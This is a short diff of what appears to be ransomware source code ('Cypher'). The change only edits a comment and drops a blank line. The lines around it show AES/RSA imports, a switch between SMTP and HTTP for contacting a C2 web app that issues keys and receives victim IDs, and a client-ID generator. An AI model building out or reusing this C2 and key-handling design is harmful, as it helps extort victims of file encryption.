@@ -19,9 +19,8 @@ from Crypto.Cipher import AES
 from Crypto.PublicKey import RSA
 from multiprocessing import Pool
 
-# if SMTP == False, HTTP will be used to contact Cypher's C2 web app, request key and post ID. Should the operator prefer
+# If SMTP == False, HTTP will be used to contact Cypher's C2 web app, request key and post ID. Should the operator prefer
 SMTP = True
-
 
 # Function to generate our client ID
 def gen_client_ID(size=12, chars=string.ascii_uppercase + string.digits):
